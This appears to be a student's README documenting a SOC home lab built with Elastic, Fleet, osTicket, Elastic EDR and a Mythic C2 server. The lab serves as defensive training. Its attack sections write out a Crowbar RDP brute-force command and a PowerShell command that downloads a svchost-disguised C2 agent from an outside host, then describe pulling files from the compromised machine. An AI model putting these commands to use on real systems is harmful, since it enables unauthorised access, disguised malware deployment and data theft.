# SOC Home Lab Project 

### Lab Architecture Diagram

This project showcases a SOC (Security Operations Center) home lab setup, allowing for the simulation of real-world attack and defense scenarios. The architecture diagram below illustrates how each component within the lab interacts, focusing on log collection, alerting, and incident response using industry-standard tools.

![1](https://github.com/user-attachments/assets/8255c9ec-8f57-44cb-a58c-2be9da870a78)

The setup comprises various servers, each playing a specific role in the SOC workflow:

- **SOC Analyst Laptop**: This system serves as the primary monitoring and analysis point for the SOC analyst. It connects to Elastic/Kibana to access logs, dashboards, and alerts generated by other components in the lab.
  
- **Attack Laptop (Kali Linux)**: This system simulates attacker behavior, generating malicious traffic like SSH brute force attacks and RDP attempts. These activities help test the SOC’s detection and response capabilities.

- **C2 Server (Mythic)**: Acts as a command-and-control server, allowing simulated attacks to be orchestrated from the Attack Laptop.

- **Fleet Server**: Responsible for collecting logs from other systems in the lab. The logs are forwarded to Elastic & Kibana for centralized analysis.

- **Windows Server (RDP Enabled)**: Configured to allow RDP connections, this server is used to simulate attacks, generating logs for analysis.

- **Ubuntu Server (SSH Enabled)**: Configured with SSH access, it is another target for simulated attacks, providing additional log data for the SOC’s monitoring tools.

### Network Details

- **Private Network**: 172.31.0.0/24
- **IP Range**: 172.31.0.1-254
- **Subnet**: 255.255.255.0

### How the SOC Lab Works

1. **Log Collection**:
   - Logs from both the Windows and Ubuntu servers are sent to the Fleet Server. The Fleet Server forwards these logs to Elastic & Kibana, providing a centralized platform for log analysis and monitoring.

2. **Alerting**:
   - Elastic continuously monitors log data for suspicious activity. When potential threats are identified, it generates alerts. These alerts are then sent to OS Ticket, where the SOC analyst can investigate and track the incident.

3. **Simulating Attacks**:
   - The Attack Laptop (running Kali Linux) simulates real-world cyber-attacks, such as RDP brute force and SSH attacks. This enables SOC analysts to evaluate the effectiveness of the lab’s detection and response capabilities.

### Key Objectives

- **Log Analysis with Elastic & Kibana**: Learn how to use Elastic & Kibana for log analysis and monitoring in a SOC environment.
- **Fleet Management**: Set up and manage agents with Fleet for streamlined log collection across the lab environment.
- **Incident Management with OS Ticket**: Understand the process of managing incidents and tracking alerts using OS Ticket.
- **Attack Simulation**: Simulate and detect attacks using Kali Linux and a C2 server (Mythic), providing a realistic environment for testing SOC workflows.
- **Incident Detection & Response Workflow**: Gain hands-on experience in detecting, responding to, and documenting incidents in a SOC setting.

## Fleet Management and ELK Integration

In this section, I outline the setup of the ELK stack with Fleet and the integration of Linux and Windows endpoints using Elastic Agents. This setup provides centralized log management and monitoring within a SOC environment.

### Setup Summary

1. **Elastic & Kibana (ELK) Configuration**:
   - The ELK stack (ElasticSearch, Logstash, and Kibana) has been set up to facilitate log ingestion, processing, and visualization.
   - Kibana offers dashboards, metrics, and alerts, essential for effective SOC operations.

2. **Fleet Server**:
   - A Fleet Server is configured to serve as the management hub for Elastic Agents deployed on endpoints.
   - The Fleet Server collects logs and metrics from each agent and forwards them to ElasticSearch for analysis and storage.

3. **Endpoint Configuration**:
   - **Linux Endpoint (NERICK-Linux-Martinez)**: The Linux endpoint is configured to send logs to Elastic via Elastic Agent, which collects general Linux system logs, including audit logs and authentication logs. Unlike Windows, Sysmon is not available on Linux; however, similar data can be captured using native Linux tools, such as Auditd, which is configured to monitor security-related activities.
   
   - **Windows Endpoint (NERICK-WIN-Martinez)**: Sysmon is installed on the Windows endpoint to capture detailed security event logs such as process creation, network connections, and file modifications. This data is valuable for detecting suspicious activities within the Windows environment.
   
   - Both endpoints are registered as agents in the Fleet Server, ensuring that logs are continuously forwarded to ElasticSearch for centralized analysis.

   ![9](https://github.com/user-attachments/assets/49988566-b2f7-4a4e-92eb-2a591fab95d1)

4. **Agent Policies**:
   - Each agent is assigned a tailored policy:
     - **Nerick-Linux-Policy**: Configures the Linux endpoint to collect essential system and audit logs, covering login events, system modifications, and other relevant security data.
     - **Nerick-Windows-Policy**: Captures detailed Windows event logs generated by Sysmon, including process creations, network connections, and registry modifications.
   - These policies are managed through Fleet, enabling easy configuration updates and consistency across endpoints.

### Fleet Management Console

The **Fleet Management Console** (as shown in the screenshot above) provides:
   - The health status of each agent, indicating all agents are in a "Healthy" state.
   - CPU and memory usage per endpoint, helping ensure agents operate within the system's resource limits.
   - Last activity timestamps, which confirm the agents are actively communicating with the Fleet Server.
   - Elastic Agents' versions, ensuring compatibility with the ELK stack.

### Kibana Dashboards

The **Kibana Security Dashboards** provide a comprehensive view of security-related data:

  ![1](https://github.com/user-attachments/assets/6cdfed99-9dc1-4a1e-bce8-db512188556f)

This setup enables efficient log management, monitoring, and alerting, forming a robust foundation for incident detection and response in a SOC environment.

## Observing SSH and RDP Brute Force Attempts

One of the first security issues observed in the SOC environment was a series of SSH and RDP brute-force attacks targeting the Linux and Windows endpoints. These attacks were discovered through the Linux authentication logs and visualized within Elastic, providing insight into the origin and frequency of these attempts.

### Authentication Logs Analysis

On the **Linux Endpoint (NERICK-Linux-Martinez)**, authentication logs (`auth.log`) revealed numerous failed login attempts for various user accounts, particularly for the `root` user. These logs indicated repeated access attempts from the same IP address, suggesting automated tools scanning for open SSH services and attempting to brute-force login credentials.

**Example Log Output**:
![10](https://github.com/user-attachments/assets/45261b01-89db-42e1-ad5c-465155f5c15a)

The repeated "Failed password" messages, along with attempts for nonexistent users (e.g., `Antminer` and `baikal`), indicate a dictionary or brute-force attack aimed at exploiting weak SSH credentials.

### Elastic Detection

Elastic further confirmed the activity through its dashboards, where failed SSH events were aggregated and visualized. Elastic’s ability to enrich log data with geo-location allowed for the identification of the originating countries, such as the Netherlands and Singapore, suggesting that these might be coordinated scanning attempts from botnets or other malicious actors.

**Example Kibana View**:
 
![13](https://github.com/user-attachments/assets/feb4f359-47b1-4ffc-a580-1c12c1a494e8)

## Analysis of RDP and SSH Brute Force Attempts

Setting up the dashboards to monitor SSH and RDP authentication attempts has been an eye-opening experience! It's fascinating (and a little unnerving) to see just how frequently these services are targeted when exposed to the internet. The constant brute-force attempts, the geographic origins, and the usernames attackers focus on reveal a lot about common attack patterns and the relentless nature of automated threats.

### Key Findings from the Dashboards

1. **RDP Brute Force Activity**:
   - The **RDP Failed Authentications** dashboard paints a clear picture: Poland stands out as a major origin of failed RDP login attempts, with thousands of hits targeting generic usernames like `ADMINISTRATOR`, `ADMIN`, `USER`, and `SUPPORT`. It’s fascinating to see the volume here – almost like watching a botnet in action, systematically trying to gain access.
   - What’s particularly intriguing is that while there are thousands of failed RDP attempts, there’s only one successful login recorded (which, in this case, is actually my own access attempt from the United Kingdom). This single entry stands out against a sea of failures, underscoring just how persistent these brute-force attempts are – they seem to keep going despite minimal success!

   
![15](https://github.com/user-attachments/assets/494bc1f9-eef3-4aaf-a767-c0d674b0b01a)

2. **SSH Brute Force Activity**:
   - The **SSH Failed Authentications** dashboard is just as active, with many attempts targeting `root`, `admin`, `test`, and other common usernames. The IP addresses initiating these attempts seem to span across multiple countries, with prominent sources from **Poland**, **Canada**, and **Ukraine**.
   - The visualization really drives home how attackers often use these common usernames in their brute-force efforts, likely because they’re aiming for systems that haven’t changed default credentials or are using weak passwords. I didn’t realize how common this was until I saw it mapped out in real-time data!
   - Just like with RDP, there's only one successful SSH authentication, which again is my own legitimate access. Seeing this lone success alongside hundreds of failed attempts really illustrates how rare actual access is, even though the attacks themselves are so persistent.

  ![21](https://github.com/user-attachments/assets/08658169-e4c3-40f2-89a9-0c9aaf6df354)

3. **Top Targeted Usernames and Source IPs**:
   - The tables add another layer of insight. It’s interesting to see that attackers frequently target usernames like `ADMINISTRATOR` for RDP and `root` for SSH. It’s almost like these accounts are universal targets, which makes sense since they’re commonly used by admins. 
   - The IP addresses initiating these attacks are also worth noting. Many attempts come from the same IPs repeatedly, suggesting that these might be bot-driven attempts or coordinated efforts. For example, there’s a specific IP from Poland that shows up consistently across the RDP attempts, targeting multiple usernames. This kind of pattern really highlights how automated and systematic these attacks are – they’re not just random, but rather appear organized and repetitive.

### Reflections on the Findings

What’s truly fascinating here is the scale and persistence of these brute-force attempts. Even though these attackers are mostly failing, the volume suggests they’re banking on hitting a weak target eventually. Seeing only one successful login (my own) amidst so many failures almost makes me appreciate how much noise is out there, constantly probing for an entry point. It’s like peering into the mind of an attacker – or at least into the relentless automation driving these attacks.

Also, visualizing the data geographically brings a new level of understanding. I hadn't fully grasped before how widespread these attempts are, with various regions contributing to the attacks. It’s like a network of constant probing, testing, and retrying across the globe.

In the end, setting up these dashboards has been like uncovering a hidden world. It’s easy to overlook this kind of activity, but once visualized, it becomes so clear how important monitoring really is. These dashboards offer a real-time glimpse into a dynamic environment where attackers are always active, which has been both a humbling and thrilling discovery!

---

## Brute-Force Attack Simulation on RDP with Crowbar

In an attempt to simulate a brute-force attack scenario, I used Kali Linux to test access to my own Windows machine via RDP. By using Crowbar, a tool designed for brute-forcing credentials on remote services, I managed to successfully authenticate and gain access to the Windows machine. This exercise was conducted in a controlled environment and offers a firsthand look into the mechanics of brute-force attacks and the potential risks associated with exposed RDP services.

### Attack Execution Details

1. **Wordlist Creation**:
   - First, I compiled a custom wordlist (`nerick-wordlist.txt`) containing various common passwords. This list includes predictable and weak passwords that are commonly targeted, such as `1234567890`, `password`, `football`, and even a more complex one, `H4RD3$TP4$$w0RD!`, which ultimately turned out to be the correct password.
   - **Sample Wordlist**:
    
![24](https://github.com/user-attachments/assets/66e98cf7-a184-4b25-aec9-4cc4faa50b62)

2. **Running Crowbar**:
   - Using Crowbar, I specified the target IP (`95.179.201.12`), the RDP service, the `Administrator` username, and my custom wordlist. Crowbar iterated through each password in the wordlist until it found the correct one.
   - **Crowbar Command and Output**:
     ```shell
     crowbar -b rdp -u Administrator -C nerick-wordlist.txt -s 95.179.201.12/32
     ```
   - After a few tries, Crowbar returned an "RDP-SUCCESS" message, confirming a successful login with the credentials: `Administrator:H4RD3$TP4$$w0RD!`.

![25](https://github.com/user-attachments/assets/07bb9091-4073-4297-8222-233ddef941be)

3. **Accessing the Windows Machine**:
   - Once the correct credentials were identified, I initiated an RDP session to the target Windows machine. Successfully logging in as `Administrator`, I was able to verify the access and execute commands on the system.
   - **Verification of Access**:
     - I checked the `net user administrator` command, which displayed account details and confirmed that I had full administrative access to the system. This reinforces the importance of choosing strong, unique passwords for critical accounts.
     
![26](https://github.com/user-attachments/assets/c40329d7-6a14-4629-be21-606b723cfbe9)

### Reflections on the Simulation

This simulation provided hands-on insight into how brute-force attacks work against RDP services. Watching Crowbar systematically test passwords highlighted how easily automated tools can exploit weak credentials. It’s one thing to read about brute-force attacks, but seeing it in action really drives home the importance of strong passwords and active monitoring. Observing both the attack and the log entries in Kibana also gave me a better understanding of what to look for in real-world scenarios.

## Setting Up a Mythic C2 Server with the Apollo Agent

To simulate a real-world post-exploitation scenario, I set up a Mythic C2 server and deployed an agent (Apollo) on the compromised Windows machine. The Apollo agent is disguised as a legitimate process (`svchost.exe`) to evade detection, allowing it to run quietly in the background.

### Deployment Process

1. **Mythic C2 Server Configuration**:
   - I configured the Mythic C2 server to deploy the Apollo agent, which is designed to operate on Windows systems. The server manages the payloads and provides a command-and-control interface.
   - **Apollo Agent Details**:
     - Author: `@djohnstein`
     - Supported OS: Windows
     - Description: A feature-rich, .NET-compatible agent tailored for training and simulation.

     ![27](https://github.com/user-attachments/assets/bdf42b9b-ef4e-4ee9-8851-0dc55af06dbf)

2. **Downloading and Executing the Payload**:
   - On the compromised Windows machine, I used PowerShell to download the agent (`svchost-martinez.exe`) directly from the Mythic C2 server:
     ```powershell
     Invoke-WebRequest -Uri http://95.179.238.169:9999/svchost-martinez.exe -OutFile "C:\Users\Public\Downloads\svchost-martinez.exe"
     ```
   - This file, masquerading as a typical Windows `svchost.exe` process, was saved to the public downloads folder and then executed.

    ![32](https://github.com/user-attachments/assets/9cc520d7-5d43-4607-8b95-f48bf82143ca)

3. **Running the Agent in the Background**:
   - Upon execution, the Apollo agent appeared in the Windows Task Manager as `svchost-martinez.exe`, mimicking a legitimate system process to blend in. This tactic of disguising malicious processes is commonly used in real-world attacks to avoid detection by end-users or automated security tools.
   - **Process Confirmation**:
     - I confirmed that the agent was running in Task Manager under the name `svchost-martinez.exe` with a description labeled "Apollo," which aligns with its configuration in the Mythic server.

    ![34](https://github.com/user-attachments/assets/07c41a93-63b7-458d-8f44-56f152c4689d)

## Confirming Control Over the Compromised Machine via Mythic C2

With the Apollo agent successfully running on the compromised Windows machine, I could confirm full control through the Mythic C2 interface. This control allows me to execute commands, retrieve information, and download files from the compromised system. Below are the key observations and actions performed.

### Verification of Machine Control

1. **Identity and Network Information**:
   - Using the `whoami` command, I verified that the compromised machine is running under the `Administrator` account on the domain `NERICK-WIN-MART`. This command returned both the local and impersonation identities, confirming administrative-level access.
   - Additionally, running the `ipconfig` command provided the IP and network configuration details, helping validate that the machine is actively communicating with the C2 server and confirming its network context.

  ![38](https://github.com/user-attachments/assets/6b6496a2-bce0-4028-a135-bd32efb1fdfa)

2. **File Retrieval Example**:
   - To demonstrate the ability to download files from the compromised machine, I retrieved a sample `passwords.txt` file from the `C:\Users\Administrator\Documents` directory. This file contains the password `H4RD3$TP4$$w0RD!`, which I had created for testing purposes.
   - Successfully downloading and viewing this file in Mythic C2 highlights the full range of data extraction capabilities provided by the Apollo agent. This kind of file retrieval is a common goal in post-exploitation, allowing attackers to gather sensitive information directly from the target.

  ![39](https://github.com/user-attachments/assets/f5e8732e-f76f-40cb-929e-016f9939f2a5)

### Observations

This exercise gave me hands-on experience with C2 operations, demonstrating how commands and file downloads can be managed from the Mythic interface. Watching this control in action provided a deeper understanding of how attackers can leverage C2 tools to maintain persistence and exfiltrate data from a target system. 

Overall, setting up and testing the C2 server proved to be a powerful way to explore post-exploitation techniques in a controlled environment, revealing the capabilities of modern command-and-control frameworks.

---

## Custom Rules and Alerts for C2 Server Detection

To enhance detection capabilities, I created custom rules in my monitoring dashboard to track suspicious activity related to the C2 server setup. This allowed me to generate alerts for specific actions, such as process creations and network connections commonly associated with command-and-control activity. Experimenting with these alerts on the dashboard was an insightful way to visualize how indicators of compromise (IoCs) for a C2 server appear in a real environment.

![42](https://github.com/user-attachments/assets/7ecf5863-d507-4762-a1db-584027b79b77)

### Key Indicators Captured in the Dashboard

1. **Process Creation Events**:
   - The dashboard captures instances of process creation by `svchost-martinez.exe`, the disguised Apollo agent. This process was initiated under the `Administrator` user account and is running as `svchost.exe` to blend in with legitimate Windows processes.
   - Other related processes, such as PowerShell executions, are also logged here, providing a trace of actions initiated by the attacker-controlled agent.

2. **Network Connections Initiated by Processes**:
   - The dashboard logs network connections established by the `svchost-martinez.exe` process to the C2 server. Specifically, it shows connections to ports like `9999` and `80` on the IP address `95.179.238.169`, which is the Mythic C2 server.
   - This visibility into network traffic gives insight into the communication between the compromised machine and the C2 server, an essential indicator for C2 detection.

3. **Security Control Modifications**:
   - An interesting observation was the detection of events indicating that Microsoft Defender Antivirus was disabled, which was logged with event code `5001`. Disabling security software is a common tactic in post-exploitation, as it minimizes the chance of detection.

### Reflections on Creating Custom Detection Rules

Setting up custom detection rules was a valuable exercise in identifying C2-related activity. By tracking specific processes, network connections, and security control modifications, I could visualize how alerts for C2 operations would look in a real environment. Experimenting with these rules helped me see how small indicators combine to form a recognizable threat pattern, making this hands-on experience both insightful and practical.

---

## Integration of osTicket with Elastic for Automated Incident Management

I have successfully set up an osTicket server and configured it to integrate with Elastic using an API key. This integration enables Elastic to automatically generate tickets in osTicket based on alerts or custom conditions, streamlining incident tracking and response.

### Steps to Set Up osTicket Integration

1. **Configuring osTicket**:
   - Installed and configured osTicket on a dedicated server to manage and track incidents. This setup will allow alerts from Elastic to flow directly into osTicket, where they can be managed and escalated if necessary.

2. **Creating a Connector in Elastic**:
   - In Elastic, I created a webhook connector for osTicket and configured it to use the API key, enabling secure communication between the two platforms.
   - I defined an XML payload structure for the alerts, which includes fields like subject, sender, and message content. This structure ensures that each alert from Elastic is properly formatted and contains all necessary information.

   ![48](https://github.com/user-attachments/assets/7d946f16-fd3f-454d-9e8f-bd50eeacc35e)

3. **Testing the Integration**:
   - I tested the connector by triggering an alert in Elastic, which successfully created a new ticket in osTicket. The test confirmed that Elastic can generate tickets automatically with the correct details.
   - As shown in the osTicket dashboard, a new ticket labeled "Nerick-SOC-Challenge-Martinez" was generated, simulating an incident report from an “Angry User.” This demonstrates the integration’s ability to handle real-world alert notifications.

   ![49](https://github.com/user-attachments/assets/d399517c-0fdb-40f0-9e38-c07f73cc6853)

## Automating Incident Alerts in osTicket

I’ve set up rules and alerts within Elastic to automatically create tickets in osTicket when specific events occur, such as brute-force attempts or activity from the Mythic C2 Apollo agent. This automation allows for immediate ticket creation upon detection of suspicious activity, making incident tracking more efficient.

### Examples of Automated Tickets

The osTicket dashboard now displays tickets generated for various alerts:
- **Nerick-Mythic-C2-Apollo-Agent-Detected**: Triggered when the Apollo C2 agent activity is detected on the network, helping to track instances of potential compromise.
- **Nerick-RDP-Brute-Force-Attempts-Martinez**: Generated when RDP brute-force attempts are detected, providing visibility into unauthorized login attempts.

Each alert appears as a ticket from the “Angry User,” a placeholder I used for testing, and includes information about the event. With these automated tickets, each alert is instantly logged and ready for further investigation.

![72](https://github.com/user-attachments/assets/b049cdcc-e5b4-4fc7-8274-828fe43086a9)


### Observations

![73](https://github.com/user-attachments/assets/066569a4-b312-47ca-9c2e-5e08662dfb78)

This setup provides a streamlined way to ensure that critical security events are not overlooked. Seeing these alerts populate in osTicket has been satisfying, as it demonstrates how automated incident management can quickly turn alerts into actionable items for a SOC team.


## Experimenting with Elastic's Built-In Endpoint Detection and Response (EDR)

To further enhance security in my SOC lab environment, I enabled Elastic's built-in EDR (Endpoint Detection and Response) capabilities. The EDR setup includes automated malware detection and response, which I tested by simulating a malware presence on the endpoint. The results were impressive, as the EDR accurately identified and blocked the simulated threat in real-time.

### EDR Detection Process

1. **Endpoint Overview**:
   - I configured the endpoint, `nerick-win-martinez`, to monitor for malicious activities. Elastic EDR shows the endpoint as "Healthy" under the `Nerick-EDR` policy, confirming that the EDR agent is running and actively monitoring.

![56](https://github.com/user-attachments/assets/5a1b9b5b-bf44-4316-84da-aa7b65c03b59)

2. **Malware Detection**:
   - To test the EDR response, I placed a test file (`svchost-nerick.exe`) in the `Public Downloads` folder on the Windows machine. Elastic EDR immediately flagged this file as malware and blocked it, preventing execution. 
   - A notification appeared, stating, “Operation did not complete successfully because the file contains a virus or potentially unwanted software,” confirming that the EDR blocked access.

![67](https://github.com/user-attachments/assets/cc245abe-6206-4147-9fa5-087edc1d7748)


3. **Malware Prevention Alert**:
   - Elastic generated a "Malware Prevention Alert," classifying the detection as a high-risk event with details about the malicious file, its path, and associated hash values. The alert provided actionable information, such as the file path and the user involved, allowing for quick analysis and response.


![70](https://github.com/user-attachments/assets/95160de2-5adb-483d-9ffb-64b2de64f865)

### Observations

Setting up Elastic EDR and seeing it automatically detect and block malicious files was a fascinating experiment. The EDR’s prompt detection and comprehensive alert details illustrate how effective built-in security tools can be in protecting endpoints from threats. This setup added an extra layer of protection to the SOC environment, giving insight into how automated EDR responses function in real-world scenarios.

## Learning Reflections 

Experimenting with this SOC lab setup has been a fantastic journey, offering deep insights into both offensive and defensive security practices. Here’s an overview of what I’ve learned just by “playing around”:

### 1. **Understanding Threat Detection with Elastic**:
   - Setting up dashboards and custom rules in Elastic was an eye-opener. I got to see how specific actions, like SSH brute-force attempts and C2 activity, generate telltale signs that can be captured and visualized.
   - The ability to create automated alerts and integrate with tools like osTicket highlighted the importance of streamlined incident response workflows. Seeing alerts instantly converted into tickets was like watching theory come to life.

### 2. **Hands-On with Endpoint Detection and Response (EDR)**:
   - Configuring Elastic’s EDR and testing it with simulated malware taught me a lot about endpoint security. Watching the EDR detect and block a malicious file in real-time showed me how crucial automated defenses are for proactive threat management.
   - The detailed alerts and ability to isolate hosts or investigate further illustrated how EDR helps analysts respond quickly. It felt empowering to have such control over endpoint security in a lab environment.

### 3. **Exploring Command-and-Control (C2) Tactics with Mythic and Apollo**:
   - Setting up a Mythic C2 server and deploying the Apollo agent gave me a peek into how attackers maintain control over compromised systems. Running commands, downloading files, and observing network connections from the C2 side provided a unique perspective on adversarial tactics.
   - The experience showed me how easy it is for attackers to hide in plain sight by disguising malicious processes as legitimate ones, like `svchost.exe`. It reinforced the importance of monitoring and detection at the process and network levels.

### 4. **Automated Detection and Incident Management**:
   - Integrating Elastic with osTicket for automated incident alerts was satisfying and made me appreciate the role of automation in a SOC environment. Every alert that popped up in osTicket felt like a mini-success, showing how alerts can be effectively managed and tracked for a complete incident response lifecycle.
   - Playing with connectors and APIs also taught me the technical side of integrating different tools for smooth security operations.

### Final Thoughts

This lab setup has been like uncovering a hidden world of security operations. Each experiment, from creating detection rules to simulating malware and exploring C2 operations, has helped me see the bigger picture of cybersecurity. The hands-on approach has deepened my understanding, turning abstract concepts into concrete skills. Overall, it’s been a rewarding journey that has made me even more curious about the world of cybersecurity!















